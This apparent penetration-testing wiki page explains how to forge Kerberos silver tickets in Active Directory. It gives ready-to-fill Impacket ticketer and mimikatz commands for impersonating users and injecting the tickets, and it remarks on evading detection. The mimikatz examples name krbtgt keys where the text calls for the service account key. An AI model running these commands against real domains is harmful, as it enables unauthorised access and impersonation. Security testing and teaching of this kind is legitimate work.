# Silver tickets

## Theory

The long-term key of a service account can be used to forge a Service ticket that can later be used with [Pass-the-ticket](../ptt.md) to access that service. In a Silver Ticket scenario, an attacker will forge a Service Ticket containing a PAC that features arbitrary information about the requesting user, effectively granting lots of access.

## Practice

{% hint style="info" %}
When forging tickets, before November 2021 updates, the user-id and groups-ids were useful but the username supplied was mostly useless. As of Nov. 2021 updates, if the username supplied doesn't exist in Active Directory, the ticket gets rejected. This also applies to Silver Tickets.
{% endhint %}

In order to craft a silver ticket, testers need to find the target service account's RC4 key (i.e. NT hash) or AES key (128 or 256 bits). This can be done by [capturing an NTLM response](../../ntlm/capture.md) (preferably NTLMv1) and [cracking](../../credentials/cracking.md) it, by [dumping LSA secrets](../../credentials/dumping/sam-and-lsa-secrets.md), by doing a [DCSync](../../credentials/dumping/dcsync.md), etc.

_"While the scope is more limited than Golden Tickets, the required hash is easier to get and there is no communication with a DC when using them, so detection is more difficult than Golden Tickets." (_[_adsecurity.org_](https://adsecurity.org/?p=2011)_)_

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [ticketer](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) can create silver tickets.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```

The SPN (ServicePrincipalName) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations (more info on [adsecurity.org](https://adsecurity.org/?page\_id=183)).
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to generate a silver ticket with [`kerberos::golden`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden). Testers need to carefully choose the right SPN type (cifs, http, ldap, host, rpcss) depending on the wanted usage.

```bash
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```

For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).
{% endtab %}
{% endtabs %}

{% hint style="info" %}
A great, stealthier, alternative is to [abuse S4U2self](../delegations/s4u2self-abuse.md) in order to impersonate a domain user with local admin privileges on the target machine by relying on Kerberos delegation instead of forging everything.
{% endhint %}

## References

{% embed url="https://en.hackndo.com/kerberos-silver-golden-tickets/" %}

{% embed url="https://adsecurity.org/?p=2011" %}
